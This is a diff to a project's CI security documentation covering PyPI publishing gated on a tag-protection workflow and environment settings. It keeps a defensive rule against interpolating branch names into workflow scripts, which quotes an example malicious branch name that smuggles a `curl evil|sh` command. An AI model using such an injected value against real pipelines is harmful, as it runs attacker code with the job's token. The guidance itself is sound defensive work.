@@ -204,10 +204,13 @@ recovery paths:
 
 These rules keep a compromised branch name, action or dispatch from publishing or running code:
 
-- **PyPI only from a `v*` tag.** `publish.yml` can be started by hand, but the PyPI job runs only
-  when the ref is a tag named `v…`. A Test PyPI run (`test_pypi: true`) may start from any ref. Also
-  restrict the `pypi` environment to tags in the repository settings (Settings → Environments →
-  `pypi` → Deployment branches and tags); a workflow cannot enforce that for itself.
+- **PyPI only after the tag gate.** A normal release publishes from a `workflow_run` once
+  `tag-protection.yml` passes for a `v*` tag on `main`; that run's ref is `main`, not the tag. A
+  hand dispatch of `publish.yml` publishes to real PyPI only from a `v*` tag, as the v0.4.3 recovery
+  did, and a Test PyPI run (`test_pypi: true`) may start from any ref. Optional hardening in the
+  repository settings (Settings → Environments → `pypi` → Deployment branches and tags): allow
+  `main` **and** the tag pattern `v*`. Never tags alone, or the normal release (which runs on
+  `main`) is blocked. A workflow cannot enforce this for itself.
 - **Branch names are data, not script.** `${{ github.head_ref }}`, `${{ github.base_ref }}` and the
   like are passed through `env:` and read as `"$VAR"`. Writing them inside a `run:` block lets a
   branch named `x";curl evil|sh;"` run commands with the job's token.
